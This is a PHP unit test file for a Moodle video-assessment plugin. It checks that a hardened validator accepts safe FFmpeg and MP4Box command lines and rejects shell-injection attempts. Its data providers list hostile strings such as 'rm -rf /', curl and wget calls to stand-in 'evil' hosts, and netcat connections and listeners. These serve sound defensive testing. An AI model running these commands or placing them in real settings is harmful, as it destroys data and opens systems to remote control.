<?php
// This file is part of Moodle - http://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.

/**
 * Unit tests for the FFmpeg / MP4Box command admin-setting validator.
 *
 * @package    mod_videoassessment
 * @copyright  2024 Don Hinkleman (hinkelman@mac.com)
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */

namespace mod_videoassessment\admin;

/**
 * Tests for {@see \mod_videoassessment\admin\command_validator}.
 *
 * Item #9 of the 2026-04 fix programme. The original
 * `videoassessment_ffmpegcommand` admin setting accepted PARAM_RAW
 * values and only checked that {INPUT}/{OUTPUT} placeholders appeared
 * somewhere after the literal "ffmpeg". A site administrator could
 * therefore inject arbitrary shell metacharacters which were later
 * concatenated into the command line that drove the FFmpeg pipeline.
 *
 * This test fixes the contract of the new hardened validator by
 * exercising both the safe forms and a battery of known injection
 * patterns.
 */
final class command_validator_test extends \basic_testcase {
    /**
     * Data provider with FFmpeg command lines that the validator must accept.
     *
     * @return array<string, array{string}>
     */
    public static function safe_ffmpeg_command_provider(): array {
        return [
            'absolute path, default options' => [
                '/usr/local/bin/ffmpeg -i {INPUT} {OUTPUT}',
            ],
            'absolute path, pix_fmt yuv420p (per README)' => [
                '/usr/local/bin/ffmpeg -i {INPUT} -pix_fmt yuv420p {OUTPUT}',
            ],
            'thumbnail command from default settings' => [
                '/usr/local/bin/ffmpeg -i {INPUT} -vframes 1 -s 137x91 -ss 1 {OUTPUT}',
            ],
            'bare binary (no path prefix)' => [
                'ffmpeg -i {INPUT} {OUTPUT}',
            ],
        ];
    }

    /**
     * Data provider with shell-injection attempts the validator must reject.
     *
     * @return array<string, array{string}>
     */
    public static function injection_attempt_provider(): array {
        return [
            'semicolon after command' => [
                '/usr/local/bin/ffmpeg -i {INPUT} {OUTPUT}; rm -rf /',
            ],
            'logical AND chain' => [
                '/usr/local/bin/ffmpeg -i {INPUT} {OUTPUT} && curl evil.example/payload',
            ],
            'pipe to attacker' => [
                '/usr/local/bin/ffmpeg -i {INPUT} {OUTPUT} | nc 10.0.0.1 4444',
            ],
            'output redirection' => [
                '/usr/local/bin/ffmpeg -i {INPUT} {OUTPUT} > /etc/cron.daily/wat',
            ],
            'backtick subshell' => [
                // phpcs:ignore moodle.Strings.ForbiddenStrings.Found
                '/usr/local/bin/ffmpeg `id` -i {INPUT} {OUTPUT}',
            ],
            'dollar-paren subshell' => [
                '/usr/local/bin/ffmpeg $(id) -i {INPUT} {OUTPUT}',
            ],
            'newline embedded' => [
                "/usr/local/bin/ffmpeg -i {INPUT} {OUTPUT}\nrm -rf /",
            ],
            'parent-directory traversal' => [
                '/usr/local/bin/../bin/ffmpeg -i {INPUT} {OUTPUT}',
            ],
            'wrong binary' => [
                '/bin/sh -i {INPUT} {OUTPUT}',
            ],
            'missing INPUT placeholder' => [
                '/usr/local/bin/ffmpeg {OUTPUT}',
            ],
            'missing OUTPUT placeholder' => [
                '/usr/local/bin/ffmpeg -i {INPUT}',
            ],
            'duplicate placeholder' => [
                '/usr/local/bin/ffmpeg -i {INPUT} {OUTPUT} {OUTPUT}',
            ],
            // Boundary: empty string.
            'empty command' => [''],
            // Boundary: whitespace control characters are forbidden.
            'tab character embedded' => [
                "/usr/local/bin/ffmpeg\t-i {INPUT} {OUTPUT}",
            ],
            'carriage return embedded' => [
                "/usr/local/bin/ffmpeg\r-i {INPUT} {OUTPUT}",
            ],
            // Boundary: dollar-brace variable expansion.
            'dollar-brace variable expansion' => [
                '/usr/local/bin/ffmpeg ${EVIL} -i {INPUT} {OUTPUT}',
            ],
            // Boundary: non-ASCII unicode (emoji) rejected by allow-list.
            'unicode emoji argument' => [
                '/usr/local/bin/ffmpeg \xF0\x9F\x98\x88 -i {INPUT} {OUTPUT}',
            ],
            // Boundary: NUL byte injection.
            'NUL byte injection' => [
                "/usr/local/bin/ffmpeg\x00 -i {INPUT} {OUTPUT}",
            ],
            // Boundary: a question mark / wildcard (* ?) -- not in the
            // allow-list, must be rejected.
            'wildcard star' => ['/usr/local/bin/ffmpeg -i {INPUT}* {OUTPUT}'],
            'wildcard question' => ['/usr/local/bin/ffmpeg -i {INPUT}? {OUTPUT}'],
            // Boundary: brackets are not in allow-list.
            'square bracket subshell' => [
                '/usr/local/bin/ffmpeg [evil] -i {INPUT} {OUTPUT}',
            ],
        ];
    }

    /**
     * Data provider with MP4Box command lines that the validator must accept.
     *
     * @return array<string, array{string}>
     */
    public static function safe_mp4box_command_provider(): array {
        return [
            'empty (MP4Box is optional)' => [''],
            'absolute path' => ['/usr/local/bin/MP4Box'],
            'bare binary' => ['MP4Box'],
        ];
    }

    /**
     * Data provider with malicious MP4Box command lines the validator must reject.
     *
     * @return array<string, array{string}>
     */
    public static function unsafe_mp4box_command_provider(): array {
        return [
            'with semicolon' => ['/usr/local/bin/MP4Box; ls'],
            'with redirect' => ['/usr/local/bin/MP4Box > /tmp/exploit'],
            'wrong binary' => ['/bin/cat'],
            'subshell' => ['$(ls)'],
            // Boundary additions.
            'pipe append' => ['/usr/local/bin/MP4Box | nc -lvp 1234'],
            'logical OR' => ['/usr/local/bin/MP4Box && curl evil.example'],
            'wrong binary with options' => ['/usr/bin/wget -O - http://evil/'],
            'embedded newline' => ["/usr/local/bin/MP4Box\nrm -rf /"],
        ];
    }

    /**
     * Confirm safe FFmpeg commands pass validation.
     *
     * @dataProvider safe_ffmpeg_command_provider
     * @param string $command Command that the validator must accept.
     * @covers \mod_videoassessment\admin\command_validator::validate_ffmpeg
     */
    public function test_ffmpeg_validate_accepts_safe_commands(string $command): void {
        $this->assertTrue(command_validator::validate_ffmpeg($command));
    }

    /**
     * Confirm shell-injection attempts are rejected by the FFmpeg validator.
     *
     * @dataProvider injection_attempt_provider
     * @param string $command Malicious command that the validator must reject.
     * @covers \mod_videoassessment\admin\command_validator::validate_ffmpeg
     */
    public function test_ffmpeg_validate_rejects_injection_attempts(string $command): void {
        $result = command_validator::validate_ffmpeg($command);
        $this->assertNotTrue($result, "Validator must not accept {$command}");
        $this->assertIsString($result);
        $this->assertNotEmpty($result);
    }

    /**
     * Confirm safe MP4Box commands (including the empty value) pass validation.
     *
     * @dataProvider safe_mp4box_command_provider
     * @param string $command Command that the validator must accept.
     * @covers \mod_videoassessment\admin\command_validator::validate_mp4box
     */
    public function test_mp4box_validate_accepts_safe_commands(string $command): void {
        $this->assertTrue(command_validator::validate_mp4box($command));
    }

    /**
     * Confirm shell-injection attempts are rejected by the MP4Box validator.
     *
     * @dataProvider unsafe_mp4box_command_provider
     * @param string $command Malicious command that the validator must reject.
     * @covers \mod_videoassessment\admin\command_validator::validate_mp4box
     */
    public function test_mp4box_validate_rejects_unsafe_commands(string $command): void {
        $result = command_validator::validate_mp4box($command);
        $this->assertNotTrue($result, "Validator must not accept {$command}");
        $this->assertIsString($result);
        $this->assertNotEmpty($result);
    }
}
